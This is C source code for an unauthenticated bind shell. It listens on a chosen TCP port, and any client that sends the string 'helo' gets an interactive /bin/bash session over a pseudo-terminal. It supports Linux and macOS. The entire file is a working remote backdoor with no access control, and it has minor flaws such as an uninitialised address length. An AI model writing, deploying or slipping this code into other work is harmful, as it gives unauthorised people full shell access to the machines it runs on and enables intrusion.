
#ifdef __linux__
  #define _XOPEN_SOURCE
  #define _XOPEN_SOURCE_EXTENDED
#endif

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX(x, y) (x > y ? x : y)

#define RECV_BUFF_LEN 256

#ifdef __MACH__
  // Each pty file as a name in the form /dev/ptyXY
  static char ptyX[] = "pqrstuvwxyzabcde";
  static char ptyY[] = "0123456789abcdef";
  static char ptyXY[] = "/dev/ptyXY";

  int openPTY(int pty[2]) {
    int i,j;
    for(i = 0; i < 16; i ++) {
      ptyXY[8] = ptyX[i];

      for(j = 0; j < 16; j ++) {
        ptyXY[9] = ptyY[j];

        if((pty[0] = open(ptyXY, O_RDWR)) != -1) {
          ptyXY[5] = 't';
          if((pty[1] = open(ptyXY, O_RDWR)) == -1) {
            perror("open ");
            return 1;
          }
          return 0;
        }
      }
    }
    fprintf(stderr, "Unable to find available pty\n");
    return 1;
  }
#elif __linux__
  int openPTY(int pty[2]) {

    if((pty[0] = open("/dev/ptmx", O_RDWR)) == -1) {
      perror("open /dev/ptmx ");
      return 1;
    }

    if(grantpt(pty[0]) == -1) {
      perror("grantpt ");
      return 1;
    }

    if(unlockpt(pty[0]) == -1) {
      perror("unlockpt ");
      return 1;
    }

    char* slave = ptsname(pty[0]);
    if(!slave) {
      perror("pstname ");
      return 1;
    }

    if((pty[1] = open(slave, O_RDWR)) == -1) {
      perror("open slave tty ");
      return 1;
    }

    return 0;
  }
#endif

static int exit_on_sigchld;
void readChildStatus(int signal, siginfo_t* info, void* uap) {
  if(info->si_signo == SIGCHLD && (info->si_code == CLD_EXITED || info->si_code == CLD_KILLED || info->si_code == CLD_DUMPED)) { // child has exited
    int status;
    waitpid(info->si_pid, &status, WNOHANG);
    if(exit_on_sigchld) exit(0);
  }
}

int main(int argc, char* const argv[]) {

  unsigned short int port;
  int client, fd_wait, i;
  socklen_t length;

  struct sockaddr_in bind_addr;
  struct sockaddr from;
  struct sigaction sig_chld;

  if(argc < 2)return 1;
  if(sscanf(argv[1], "%hu", &port) != 1) return 1;

  // Set up handler to be called when child exit
  sig_chld.sa_sigaction = readChildStatus;
  sig_chld.sa_flags = SA_SIGINFO;
  sigemptyset(&(sig_chld.sa_mask));
  exit_on_sigchld = 0;
  if(sigaction(SIGCHLD, &sig_chld, NULL) == -1) {
    perror("sigaction SIGCHLD ");
    return 1;
  }

  if((fd_wait = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    perror("socket ");
    return 1;
  }

  bind_addr.sin_family = AF_INET;
  bind_addr.sin_addr.s_addr = INADDR_ANY;
  bind_addr.sin_port = htons(port);

  if(bind(fd_wait, (struct sockaddr*) &bind_addr, sizeof(struct sockaddr_in))) {
    perror("bind ");
    return 1;
  }

  if(listen(fd_wait, 1) == 1) {
    perror("listen ");
    return 1;
  }

  printf("Listening on port %hu\n", port);

  while(1) {

    if((client = accept(fd_wait, &from, &length)) == -1) {
      if(errno != EINTR) perror("accept ");
      continue;
    }

    printf("Connexion received\n");

    if(fork()) { // Parent
      close(client);
    } else { // child
      close(fd_wait);

      exit_on_sigchld = 1; // exit when child exit

      char buf[4];
      for(i = 0; i < 4; i++) {
        if(read(client, buf + i, 1) == -1) {
          perror("read ");
          close(client);
          return 1;
        }
      }

      if(!memcmp(buf, "helo", 4)) {

        int pty[2];
        if(! openPTY(pty)) {

          pid_t child;

          if((child = fork())) { // tty master
            close(pty[1]);

            char buff[RECV_BUFF_LEN];
            unsigned int len;
            int nfds = MAX(client, pty[0]) + 1;
            fd_set rd_set;

            while(1) {
              FD_ZERO(&rd_set);
              FD_SET(pty[0], &rd_set);
              FD_SET(client, &rd_set);

              if(select(nfds, &rd_set, NULL, NULL, NULL) == -1) goto father_err;

              if(FD_ISSET(client, &rd_set)) {
                if((len = recv(client, buff, RECV_BUFF_LEN, 0)) <= 0) {
                  if(len == -1) perror("recv ");
                  goto father_err;
                }
                if(write(pty[0], buff, len) == -1) {
                  perror("write ");
                  goto father_err;
                }
              }

              if(FD_ISSET(pty[0], &rd_set)) {
                if((len = read(pty[0], buff, RECV_BUFF_LEN)) == -1) {
                  perror("read ");
                  goto father_err;
                }
                if(send(client, buff, len, 0) == -1) {
                  perror("send ");
                  goto father_err;
                }
              }
            }

            father_err:
              close(client);
              close(pty[0]);
              kill(child, SIGKILL);
              return 1;

          } else { // tty slave

            if(setsid() == -1) {
              perror("setsid ");
              return 1;
            }

            close(0); close(1); close(2); close(client); close(pty[0]);
            dup(pty[1]); dup(pty[1]); dup(pty[1]);
            close(pty[1]);

            execl("/bin/bash", NULL, NULL);
          }

        }

      }

      close(client);
      return 1;
    }

  }

  return 0;
}
